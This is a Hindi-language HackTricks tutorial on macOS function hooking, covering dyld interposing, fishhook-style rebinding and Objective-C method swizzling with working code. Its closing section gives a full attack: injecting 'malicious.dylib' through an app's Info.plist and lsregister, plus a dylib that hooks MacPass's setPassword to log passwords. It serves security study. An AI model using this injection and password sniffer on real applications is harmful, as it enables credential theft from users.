# macOS Function Hooking

{{#include ../../../banners/hacktricks-training.md}}

## Function Interposing

**`__interpose` (`__DATA___interpose`)** सेक्शन (या **`S_INTERPOSING`** से फ्लैग किया गया सेक्शन) के साथ एक **dylib** बनाएं, जिसमें **function pointers** के tuples हों जो **original** और **replacement** functions को refer करें।

फिर, **DYLD_INSERT_LIBRARIES** के साथ dylib को **inject** करें (interposing main app के load होने से पहले होना चाहिए)। जाहिर है, **`DYLD_INSERT_LIBRARIES`** के उपयोग पर लागू [**restrictions**](macos-library-injection/index.html#check-restrictions) यहां भी लागू होती हैं।

### Interpose printf

{{#tabs}}
{{#tab name="interpose.c"}}
```c:interpose.c" overflow="wrap
// gcc -dynamiclib interpose.c -o interpose.dylib
#include <stdio.h>
#include <stdarg.h>

int my_printf(const char *format, ...) {
//va_list args;
//va_start(args, format);
//int ret = vprintf(format, args);
//va_end(args);

int ret = printf("Hello from interpose\n");
return ret;
}

__attribute__((used)) static struct { const void *replacement; const void *replacee; } _interpose_printf
__attribute__ ((section ("__DATA,__interpose"))) = { (const void *)(unsigned long)&my_printf, (const void *)(unsigned long)&printf };
```
{{#endtab}}

{{#tab name="hello.c"}}
```c
//gcc hello.c -o hello
#include <stdio.h>

int main() {
printf("Hello World!\n");
return 0;
}
```
{{#endtab}}

{{#tab name="interpose2.c"}}
```c
// Just another way to define an interpose
// gcc -dynamiclib interpose2.c -o interpose2.dylib

#include <stdio.h>

#define DYLD_INTERPOSE(_replacement, _replacee) \
__attribute__((used)) static struct { \
const void* replacement; \
const void* replacee; \
} _interpose_##_replacee __attribute__ ((section("__DATA, __interpose"))) = { \
(const void*) (unsigned long) &_replacement, \
(const void*) (unsigned long) &_replacee \
};

int my_printf(const char *format, ...)
{
int ret = printf("Hello from interpose\n");
return ret;
}

DYLD_INTERPOSE(my_printf,printf);
```
{{#endtab}}
{{#endtabs}}
```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./hello
Hello from interpose

DYLD_INSERT_LIBRARIES=./interpose2.dylib ./hello
Hello from interpose
```
> [!WARNING]
> **`DYLD_PRINT_INTERPOSING`** env variable का उपयोग interposing को debug करने के लिए किया जा सकता है और यह interpose process को print करेगा।

यह भी ध्यान दें कि **interposing process और loaded libraries के बीच होती है**, यह shared library cache के साथ काम नहीं करता।

### Dynamic Interposing

अब **`dyld_dynamic_interpose`** function का उपयोग करके dynamically भी किसी function को interpose करना संभव है। यह **runtime** में किसी function को **programmatically** interpose करने की अनुमति देता है, बजाय इसके कि यह केवल **beginning** से किया जाए।

बस **replace करने वाले function और replacement function** के **tuples** indicate करने की जरूरत होती है।
```c
struct dyld_interpose_tuple {
const void* replacement;
const void* replacee;
};
extern void dyld_dynamic_interpose(const struct mach_header* mh,
const struct dyld_interpose_tuple array[], size_t count);
```
### Import Table Rebinding (fishhook-style)

यदि आपके पास पहले से **process के अंदर** code execution है और आप target को relaunch किए बिना किसी **imported C function** को hook करना चाहते हैं, तो एक बहुत common primitive है **symbol rebinding** (जिसे **`fishhook`** ने popular बनाया)।

**`__interpose`** section का उपयोग करने के बजाय, यह technique Mach-O metadata (`__LINKEDIT` -> indirect symbol table -> `__la_symbol_ptr` / `__nl_symbol_ptr`) को walk करती है और current image द्वारा उपयोग किए जा रहे **import slot** को **overwrite** करती है। यह किसी **already-running** process में functions को hook करने या **`rebind_symbols_image`** के साथ **सिर्फ एक image** को hook करने के लिए बहुत उपयोगी है।

> [!TIP]
> यह केवल उन calls को affect करता है जो वास्तव में एक **import pointer** के through जाती हैं। अगर target function **same image के अंदर सीधे call** की जाती है, तो rewrite करने के लिए कोई imported slot नहीं होता, इसलिए यह technique उस call site को नहीं देख पाएगी।
```c
// clang -dynamiclib fishhook_demo.c fishhook.c -o fishhook_demo.dylib
#include <stdio.h>
#include <unistd.h>
#include "fishhook.h"

static int (*real_close)(int);

int hooked_close(int fd) {
fprintf(stderr, "[+] close(%d)\n", fd);
return real_close(fd);
}

__attribute__((constructor))
static void install(void) {
struct rebinding rb = {"close", hooked_close, (void *)&real_close};
rebind_symbols(&rb, 1);
}
```

```bash
DYLD_INSERT_LIBRARIES=./fishhook_demo.dylib ./hello
```
हाल के macOS versions में कई rebinding targets अब writable **`__DATA`** pages में नहीं होते। Rebinders को आम तौर पर pointer patch करने से पहले **`__DATA_CONST`** को temporarily writable बनाना पड़ता है। इसके अलावा, Apple Silicon / **`arm64e`** पर आपको authenticated pointers और **`__AUTH_CONST.__auth_got`** में extra indirection की उम्मीद करनी चाहिए, इसलिए जो rebinder केवल classic lazy/non-lazy symbol pointer sections scan करता है, वह कुछ call sites miss कर सकता है।

> [!CAUTION]
> **`arm64e`** ABI कई function pointers के लिए **Pointer Authentication (PAC)** use करता है। Blind pointer writes जो Intel पर काम करते थे, Apple Silicon पर किसी call site को break कर सकते हैं। अपना खुद का rebinder या inline hooker लिखते समय, **`<ptrauth.h>`** helpers जैसे **`ptrauth_sign_unauthenticated`** या **`ptrauth_auth_and_resign`** use करने के लिए तैयार रहें और खास तौर पर **`arm64e`** targets पर test करें।

**`__AUTH`**, **`__AUTH_CONST`** और **`__auth_got`** के बारे में अधिक details के लिए [this page](../macos-apps-inspecting-debugging-and-fuzzing/objects-in-memory.md) देखें।

## Method Swizzling

ObjectiveC में method ऐसे call की जाती है: **`[myClassInstance nameOfTheMethodFirstParam:param1 secondParam:param2]`**

इसके लिए **object**, **method** और **params** की जरूरत होती है। और जब कोई method call होती है तो **`objc_msgSend`** function का use करके एक **msg भेजा जाता है**: `int i = ((int (*)(id, SEL, NSString *, NSString *))objc_msgSend)(someObject, @selector(method1p1:p2:), value1, value2);`

Object **`someObject`** है, method **`@selector(method1p1:p2:)`** है और arguments **value1**, **value2** हैं।

Object structures को follow करके, एक **methods की array** तक पहुंचना possible है, जहां method code के **names** और **pointers** **located** होते हैं।

> [!CAUTION]
> ध्यान दें कि methods और classes को उनके names के आधार पर access किया जाता है, इसलिए यह information binary में stored होती है, और इसे `otool -ov </path/bin>` या [`class-dump </path/bin>`](https://github.com/nygard/class-dump) के साथ retrieve किया जा सकता है

### Accessing the raw methods

नीचे दिए गए example की तरह methods की information, जैसे name, number of params या address, access करना possible है:
```objectivec
// gcc -framework Foundation test.m -o test

#import <Foundation/Foundation.h>
#import <objc/runtime.h>
#import <objc/message.h>

int main() {
// Get class of the variable
NSString* str = @"This is an example";
Class strClass = [str class];
NSLog(@"str's Class name: %s", class_getName(strClass));

// Get parent class of a class
Class strSuper = class_getSuperclass(strClass);
NSLog(@"Superclass name: %@",NSStringFromClass(strSuper));

// Get information about a method
SEL sel = @selector(length);
NSLog(@"Selector name: %@", NSStringFromSelector(sel));
Method m = class_getInstanceMethod(strClass,sel);
NSLog(@"Number of arguments: %d", method_getNumberOfArguments(m));
NSLog(@"Implementation address: 0x%lx", (unsigned long)method_getImplementation(m));

// Iterate through the class hierarchy
NSLog(@"Listing methods:");
Class currentClass = strClass;
while (currentClass != NULL) {
unsigned int inheritedMethodCount = 0;
Method* inheritedMethods = class_copyMethodList(currentClass, &inheritedMethodCount);

NSLog(@"Number of inherited methods in %s: %u", class_getName(currentClass), inheritedMethodCount);

for (unsigned int i = 0; i < inheritedMethodCount; i++) {
Method method = inheritedMethods[i];
SEL selector = method_getName(method);
const char* methodName = sel_getName(selector);
unsigned long address = (unsigned long)method_getImplementation(m);
NSLog(@"Inherited method name: %s (0x%lx)", methodName, address);
}

// Free the memory allocated by class_copyMethodList
free(inheritedMethods);
currentClass = class_getSuperclass(currentClass);
}

// Other ways to call uppercaseString method
if([str respondsToSelector:@selector(uppercaseString)]) {
NSString *uppercaseString = [str performSelector:@selector(uppercaseString)];
NSLog(@"Uppercase string: %@", uppercaseString);
}

// Using objc_msgSend directly
NSString *uppercaseString2 = ((NSString *(*)(id, SEL))objc_msgSend)(str, @selector(uppercaseString));
NSLog(@"Uppercase string: %@", uppercaseString2);

// Calling the address directly
IMP imp = method_getImplementation(class_getInstanceMethod(strClass, @selector(uppercaseString))); // Get the function address
NSString *(*callImp)(id,SEL) = (typeof(callImp))imp; // Generates a function capable to method from imp
NSString *uppercaseString3 = callImp(str,@selector(uppercaseString)); // Call the method
NSLog(@"Uppercase string: %@", uppercaseString3);

return 0;
}
```
### `method_exchangeImplementations` के साथ Method Swizzling

फ़ंक्शन **`method_exchangeImplementations`** **एक फ़ंक्शन की implementation का address दूसरे के लिए बदलने** की अनुमति देता है।

> [!CAUTION]
> इसलिए जब कोई फ़ंक्शन call किया जाता है, तो जो **execute** होता है वह **दूसरा वाला** होता है।
```objectivec
//gcc -framework Foundation swizzle_str.m -o swizzle_str

#import <Foundation/Foundation.h>
#import <objc/runtime.h>


// Create a new category for NSString with the method to execute
@interface NSString (SwizzleString)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from;

@end

@implementation NSString (SwizzleString)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from {
NSLog(@"Custom implementation of substringFromIndex:");

// Call the original method
return [self swizzledSubstringFromIndex:from];
}

@end

int main(int argc, const char * argv[]) {
// Perform method swizzling
Method originalMethod = class_getInstanceMethod([NSString class], @selector(substringFromIndex:));
Method swizzledMethod = class_getInstanceMethod([NSString class], @selector(swizzledSubstringFromIndex:));
method_exchangeImplementations(originalMethod, swizzledMethod);

// We changed the address of one method for the other
// Now when the method substringFromIndex is called, what is really called is swizzledSubstringFromIndex
// And when swizzledSubstringFromIndex is called, substringFromIndex is really called

// Example usage
NSString *myString = @"Hello, World!";
NSString *subString = [myString substringFromIndex:7];
NSLog(@"Substring: %@", subString);

return 0;
}
```
> [!WARNING]
> इस मामले में यदि **legit** method का **implementation code** **method name** को **verify** करता है, तो यह swizzling को **detect** कर सकता है और इसे चलने से रोक सकता है।
>
> निम्न तकनीक में यह restriction नहीं है।

### `method_setImplementation` के साथ Method Swizzling

पिछला format अजीब है क्योंकि आप 2 methods के implementation को एक-दूसरे से बदल रहे होते हैं। **`method_setImplementation`** function का उपयोग करके आप एक **method** के **implementation** को दूसरे वाले से **change** कर सकते हैं।

बस यह याद रखें कि **original** implementation का address **store** कर लें, अगर आप overwriting से पहले new implementation से उसे call करने वाले हैं, क्योंकि बाद में उस address को locate करना बहुत ज्यादा complicated हो जाएगा।
```objectivec
#import <Foundation/Foundation.h>
#import <objc/runtime.h>
#import <objc/message.h>

static IMP original_substringFromIndex = NULL;

@interface NSString (Swizzlestring)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from;

@end

@implementation NSString (Swizzlestring)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from {
NSLog(@"Custom implementation of substringFromIndex:");

// Call the original implementation using objc_msgSendSuper
return ((NSString *(*)(id, SEL, NSUInteger))original_substringFromIndex)(self, _cmd, from);
}

@end

int main(int argc, const char * argv[]) {
@autoreleasepool {
// Get the class of the target method
Class stringClass = [NSString class];

// Get the swizzled and original methods
Method originalMethod = class_getInstanceMethod(stringClass, @selector(substringFromIndex:));

// Get the function pointer to the swizzled method's implementation
IMP swizzledIMP = method_getImplementation(class_getInstanceMethod(stringClass, @selector(swizzledSubstringFromIndex:)));

// Swap the implementations
// It return the now overwritten implementation of the original method to store it
original_substringFromIndex = method_setImplementation(originalMethod, swizzledIMP);

// Example usage
NSString *myString = @"Hello, World!";
NSString *subString = [myString substringFromIndex:7];
NSLog(@"Substring: %@", subString);

// Set the original implementation back
method_setImplementation(originalMethod, original_substringFromIndex);

return 0;
}
}
```
## Hooking Attack Methodology

इस पेज पर functions को hook करने के अलग-अलग तरीके चर्चा किए गए थे। हालांकि, इनमें **attack करने के लिए process के अंदर code चलाना** शामिल था।

ऐसा करने के लिए सबसे आसान technique [Dyld via environment variables or hijacking](macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md) inject करना है। हालांकि, मेरा मानना है कि यह [Dylib process injection](macos-ipc-inter-process-communication/index.html#dylib-process-injection-via-task-port) के जरिए भी किया जा सकता है।

हालांकि, दोनों options **unprotected** binaries/processes तक ही **limited** हैं। limitations के बारे में और जानने के लिए हर technique को देखें।

फिर भी, function hooking attack बहुत specific है, attacker इसे **process के अंदर से sensitive information steal करने** के लिए करेगा (वरना आप बस process injection attack करते)। और यह sensitive information user द्वारा downloaded Apps जैसे MacPass में हो सकती है।

इसलिए attacker का vector या तो कोई vulnerability ढूँढना होगा या application की signature strip करना होगा, फिर application के Info.plist के जरिए **`DYLD_INSERT_LIBRARIES`** env variable inject करना होगा, कुछ इस तरह:
```xml
<key>LSEnvironment</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/Applications/Application.app/Contents/malicious.dylib</string>
</dict>
```
और फिर **re-register** the application:
```bash
/System/Library/Frameworks/CoreServices.framework/Frameworks/LaunchServices.framework/Support/lsregister -f /Applications/Application.app
```
उस लाइब्रेरी में जानकारी exfiltrate करने के लिए hooking code जोड़ें: Passwords, messages...

> [!CAUTION]
> ध्यान दें कि macOS के नए versions में यदि आप application binary के **signature को strip** करते हैं और उसे पहले execute किया जा चुका था, तो macOS **application को** अब **execute नहीं करेगा**.

#### Library example
```objectivec
// gcc -dynamiclib -framework Foundation sniff.m -o sniff.dylib

// If you added env vars in the Info.plist don't forget to call lsregister as explained before

// Listen to the logs with something like:
// log stream --style syslog --predicate 'eventMessage CONTAINS[c] "Password"'

#include <Foundation/Foundation.h>
#import <objc/runtime.h>

// Here will be stored the real method (setPassword in this case) address
static IMP real_setPassword = NULL;

static BOOL custom_setPassword(id self, SEL _cmd, NSString* password, NSURL* keyFileURL)
{
// Function that will log the password and call the original setPassword(pass, file_path) method
NSLog(@"[+] Password is: %@", password);

// After logging the password call the original method so nothing breaks.
return ((BOOL (*)(id,SEL,NSString*, NSURL*))real_setPassword)(self, _cmd,  password, keyFileURL);
}

// Library constructor to execute
__attribute__((constructor))
static void customConstructor(int argc, const char **argv) {
// Get the real method address to not lose it
Class classMPDocument = NSClassFromString(@"MPDocument");
Method real_Method = class_getInstanceMethod(classMPDocument, @selector(setPassword:keyFileURL:));

// Make the original method setPassword call the fake implementation one
IMP fake_IMP = (IMP)custom_setPassword;
real_setPassword = method_setImplementation(real_Method, fake_IMP);
}
```
## संदर्भ

- [https://nshipster.com/method-swizzling/](https://nshipster.com/method-swizzling/)
- [https://github.com/facebook/fishhook](https://github.com/facebook/fishhook)
- [https://clang.llvm.org/docs/PointerAuthentication.html](https://clang.llvm.org/docs/PointerAuthentication.html)

{{#include ../../../banners/hacktricks-training.md}}
